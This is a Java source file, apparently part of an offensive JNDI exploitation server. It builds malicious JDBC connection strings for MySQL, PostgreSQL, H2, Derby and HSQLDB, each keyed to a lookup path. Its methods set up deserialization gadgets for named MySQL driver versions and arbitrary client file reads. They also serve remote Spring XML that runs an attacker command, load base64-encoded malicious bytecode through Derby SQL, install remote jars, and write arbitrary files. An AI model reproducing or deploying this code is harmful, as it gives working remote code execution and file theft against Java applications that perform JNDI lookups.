package cn.butler.jndi.controller;

import cn.butler.jndi.JndiConfig;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.jndi.server.WebServer;
import cn.butler.jndi.util.MiscUtil;
import cn.butler.payloads.ObjectPayload;
import cn.butler.thirdparty.payloads.JarHandle.JarPayload;
import cn.butler.thirdparty.payloads.custom.ClassHandleUtil;
import cn.butler.thirdparty.payloads.expression.JSExpression;
import cn.butler.thirdparty.payloads.expression.SpelExpression;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

public abstract class DatabaseController implements Controller {
    @JNDIMapping("/MySQL/Deserialize{n}/{host}/{port}/{user}")
    public Properties mysqlDeserialize(String n, String host, String port, String user) throws Exception {
        System.out.println("[MySQL] [Deserialize] Host: " + host + " Port: " + port + " User: " + user);
        String url;

        // 反序列化
        switch (n) {
            case "1":
                // detectCustomCollations
                // 5.1.19-5.1.48, 6.0.2-6.0.6
                url = "jdbc:mysql://" + host + ":" + port + "/test?detectCustomCollations=true&autoDeserialize=true&user=" + user;
                break;
            case "2":
                // ServerStatusDiffInterceptor
                // 5.1.11-5.1.48
                url = "jdbc:mysql://" + host + ":" + port + "/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=" + user;
                break;
            case "3":
                // ServerStatusDiffInterceptor
                // 6.0.2-6.0.6
                url = "jdbc:mysql://" + host + ":" + port + "/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=" + user;
                break;
            case "4":
                // ServerStatusDiffInterceptor
                // 8.0.7-8.0.19
                url = "jdbc:mysql://" + host + ":" + port + "/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=" + user;
                break;
            default:
                throw new Exception("Unknown MySQL payload");
        }

        Properties props = new Properties();
        props.setProperty("driver", "com.mysql.jdbc.Driver"); // 高版本 MySQL 驱动 jar 仍然保留了这个类以确保兼容性
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/MySQL/FileRead/{host}/{port}/{user}")
    public Properties mysqlFileRead(String host, String port, String user) {
        System.out.println("[MySQL] [FileRead] Host: " + host + " Port: " + port + " User: " + user);

        // 客户端任意文件读取 (全版本)
        String url = "jdbc:mysql://" + host + ":" + port + "/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360&user=" + user;

        Properties props = new Properties();
        props.setProperty("driver", "com.mysql.jdbc.Driver"); // 高版本 MySQL 驱动 jar 仍然保留了这个类以确保兼容性
        props.setProperty("url", url);

        return props;
    }

    /**
     * PostgreSQL 命令执行
     * @param cmd
     * @return
     */
    @JNDIMapping("/PostgreSQL/Command/{cmd}")
    public Properties postgresqlCommand(String cmd) {
        System.out.println("[PostgreSQL] Cmd: " + cmd);

        String fileName = MiscUtil.getRandStr(12) + ".xml";
        String fileContent = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                "        <constructor-arg>\n" +
                "        <list>\n" +
                "            <value><![CDATA[" + cmd + "]]></value>\n" +
                "        </list>\n" +
                "        </constructor-arg>\n" +
                "    </bean>\n" +
                "</beans>";
        WebServer.getInstance().serveFile( "/" + fileName, fileContent.getBytes());

        String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = JndiConfig.codebase + fileName;
        String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=" + socketFactory + "&socketFactoryArg=" + socketFactoryArg;

        Properties props = new Properties();
        props.setProperty("driver", "org.postgresql.Driver");
        props.setProperty("url", url);

        return props;
    }

    /**
     * PostgreSQL ClassPathXmlApplicationContext调用SPEL自定义代码执行
     * @param explot
     * @param impact
     * @return
     */
    @JNDIMapping("/PostgreSQL/SPEL/{explot}/{impact}")
    public Properties postgresqlSPELCustomPath(String explot,String impact) throws IOException {
        System.out.println("[H2] [JavaScript] Impact: " + explot + ":" + impact);
        //Java字节码制作
        String effect = explot+":"+impact;
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",effect);

        //SPEL-Payload制作
        String code = JSExpression.commonExpressModify((byte[])objects[1]);
        String spelPayload = SpelExpression.spelJsCode(code);
        // Replace single quotes with two single quotes SPEL加载JS字节码必须要这样
//        String modifiedCode = code.replace("'", "''");
//        String spelPayload = "#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('"+ modifiedCode +"')}";

        //远程XML设置
        String fileName = MiscUtil.getRandStr(12) + ".xml";
        String fileContent = "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
            "       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
            "       xsi:schemaLocation=\"\n" +
            "     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
            "    <bean id=\"test\" class=\"java.lang.String\">\n" +
            "        <property name=\"whatever\" value=\""+ spelPayload +"\"/>\n" +
            "    </bean>\n" +
            "</beans>\n";
        WebServer.getInstance().serveFile( "/" + fileName, fileContent.getBytes());

        String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = JndiConfig.codebase + fileName;
        String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=" + socketFactory + "&socketFactoryArg=" + socketFactoryArg;

        Properties props = new Properties();
        props.setProperty("driver", "org.postgresql.Driver");
        props.setProperty("url", url);
        return props;
    }

    /**
     * PostgreSQL FileOutputStream创建空文件
     * @param filename
     * @return
     */
    @JNDIMapping("/PostgreSQL/FileOutputStream/{filename}")
    public Properties postgresqlFileOutputStream(String filename) throws IOException {
        String log = String.format("[PostgreSQL]:FileOutputStream: TargetPath: %s",filename);
        System.out.println(log);

        String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=java.io.FileOutputStream&socketFactoryArg="+filename;

        Properties props = new Properties();
        props.setProperty("driver", "org.postgresql.Driver");
        props.setProperty("url", url);
        return props;
    }

    /**
     * PostgreSQL loggerFile任意写文件
     * @param targetpath
     * @return
     */
    @JNDIMapping("/PostgreSQL/LoggerFile/{filepath}/{targetpath}")
    public Properties postgresqlLoggerFileCustomPath(String filepath,String targetpath) throws IOException {
        String log = String.format("[PostgreSQL]:loggerfile: TargetPath: %s, TargetContentPath: %s",filepath,targetpath);
        System.out.println(log);

        List<String> lines = Files.readAllLines(Paths.get(targetpath));
        String content = String.join("\n", lines);

        String url = "jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=debug&loggerFile="+filepath+ "&"+content;

        Properties props = new Properties();
        props.setProperty("driver", "org.postgresql.Driver");
        props.setProperty("url", url);
        return props;
    }

    /**
     * H2 Database CREATE ALIAS打Java命令执行
     * @param explot
     * @param impact
     * @return
     */
    @JNDIMapping("/H2CreateAlias/{explot}/{impact}")
    public Properties h2Java(String explot,String impact) {
        System.out.println("[H2] [H2CreateAlias] Impact: " + explot + ":" + impact);
        String effect = explot+":"+impact;

        String h2Url = (String)ObjectPayload.Utils.makePayloadObject("JdbcAttack", "H2CreateAlias", effect);
        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", h2Url);
        return props;
    }

    /**
     * H2 Database CREATE ALIAS打Groovy代码执行
     * @param explot
     * @param impact
     * @return
     */
    @JNDIMapping("/H2Groovy/{explot}/{impact}")
    public Properties h2GroovyPath(String explot,String impact) throws IOException {
        System.out.println("[H2] [Groovy] Impact: " + explot + ":" + impact);
        String effect = explot+":"+impact;

        String h2Url = (String)ObjectPayload.Utils.makePayloadObject("JdbcAttack", "H2Groovy", effect);
        System.out.println(h2Url);
        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", h2Url);

        return props;
    }

    /**
     * H2 Database CREATE TRIGGER打JavaScript命令执行
     * @param explot
     * @param impact
     * @return
     */
    @JNDIMapping("/H2JavaScript/{explot}/{impact}")
    public Properties h2JavaScript(String explot,String impact) {
        System.out.println("[H2] [JavaScript] Impact: " + explot + ":" + impact);
        String effect = explot+":"+impact;

        String h2Url = (String)ObjectPayload.Utils.makePayloadObject("JdbcAttack", "H2JavaScript", effect);
        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", h2Url);
        return props;
    }

    /**
     * Derby Salve主从复制打法创建数据库
     * @param database
     * @return
     */
    @JNDIMapping("/Derby/Create/{database}")
    public Properties derbyCreate(String database) {
        System.out.println("[Derby] [Create] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        return props;
    }

    /**
     * Derby Salve主从复制/远程加载jar删除数据库
     * @param database
     * @return
     */
    @JNDIMapping("/Derby/Drop/{database}")
    public Properties derbyDrop(String database) {
        System.out.println("[Derby] [Drop] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";drop=true";
        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url",url);
        return props;
    }

    /**
     * Derby Salve主从复制触发Java原生反序列化
     * @param host
     * @param port
     * @param database
     * @return
     */
    @JNDIMapping("/Derby/Slave/{host}/{port}/{database}")
    public Properties derbySlave(String host, String port, String database) {
        System.out.println("[Derby] [Slave] Host: " + host + " Port: " + port + " Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";startMaster=true;slaveHost=" + host + ";slavePort=" + port;
        System.out.println(url);
        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        return props;
    }

    /**
     * Derby SQL RCE执行多条SQL语句远程加载jar包
     *  -jar包内部的代码逻辑支持: 更多命令执行
     * @param database
     * @param explot
     * @param impact
     * @return
     * @throws Exception
     */
    @JNDIMapping("/Derby/Inject/{database}/{explot}/{impact}")
    public Properties derbyInject(String database,String explot,String impact) {
        System.out.println("[Derby] [Inject] Database Impact: " + explot + ":" + impact);

        //通过ThirdPartyAttack模块制作恶意的字节码
        String url = "jdbc:derby:memory:" + database + ";create=true";
        String effect = explot+":"+impact;
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",effect);
        String className = (String) objects[0];
        byte[] byteCode = (byte[]) objects[1];
        String base64ByteCode = Base64.getEncoder().encodeToString(byteCode);

        // 构造Derby的SQL语句,不需要远程加载jar包
        List<String> list = new ArrayList<>();
        list.add(String.format("create type %sClass external name 'java.lang.Class' language java",className));
        list.add(String.format("create type %sObject external name 'java.lang.Object' language java",className));
        list.add(String.format("create type %sClassLoader external name 'java.lang.ClassLoader' language java",className));
        list.add(String.format("create function %s64Decode(className VARCHAR(32672)) returns VARCHAR(32672) FOR BIT DATA external name 'org.springframework.util.Base64Utils.decodeFromString' language java parameter style java",className));
        list.add(String.format("create function get%smClassLoader() returns %sClassLoader external name 'java.lang.ClassLoader.getSystemClassLoader' language java parameter style java",className,className));
        list.add(String.format("create function de%sClass(className VARCHAR(32672),bytes VARCHAR(32672) FOR BIT DATA,loader %sClassLoader) returns %sClass external name 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)' language java parameter style java",className,className,className));
        list.add(String.format("create table inje%sct(v %sClass)",className,className));
        list.add(String.format("insert into inje%sct values (de%sClass('%s', %s64Decode('%s'), get%smClassLoader()))",className,className,className,className,base64ByteCode,className));
//        list.forEach(System.out::println);

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", String.join(";", list));
        return props;
    }

    @JNDIMapping("/Derby/Install/Remote/{database}/{explot}/{impact}")
    public Properties derbyRemoteInstall(String database,String explot,String impact) throws Exception {
        System.out.println("[Derby] [Install Remote] Database Impact: " + explot + ":" + impact);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        //生成漏洞利用效果的字节码
        String effect = explot+":"+impact;
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",effect);
        //给字节码创建个随机的静态方法
        String staticMethodName = MiscUtil.getRandStr(5);
        objects = (Object[]) ClassHandleUtil.modifyCustomStaticMethodClass((String) objects[0],(byte[]) objects[1],staticMethodName);
        String className = (String) objects[0];
        byte[] byteCode = (byte[]) objects[1];

        byte[] jarBytes = JarPayload.create(className, byteCode);
        WebServer.getInstance().serveFile("/" + className + ".jar", jarBytes);

        List<String> list = new ArrayList<>();
        list.add(String.format("CALL SQLJ.INSTALL_JAR('%s.jar', 'APP.%s', 0)",JndiConfig.codebase + className,className));
        list.add(String.format("CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP.%s')",className));
        list.add(String.format("CREATE PROCEDURE %s() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '%s.%s'",staticMethodName,className,staticMethodName));
        list.add(String.format("CALL %s()",staticMethodName));
        list.forEach(System.out::println);

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", String.join(";", list));

        return props;
    }


    @JNDIMapping("/HSQLDB/Custom/{sql}")
    public Properties hsqldbReverseShell(String sql) {
        System.out.println("[HSQLDB] [Connection] SQL: " + sql);

        String url = "jdbc:hsqldb:mem;";
//        String sql = "CALL \"java.lang.System.setProperty\"('com.sunjndi.rmi.object.trustURLCodebase','true');"+
//            "CALL \"java.naming.InitialContext.doLookup\"('ldap://')";

        Properties props = new Properties();
        props.setProperty("driver", "org.hsqldb.jdbc.JDBCDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);
        return props;
    }
}
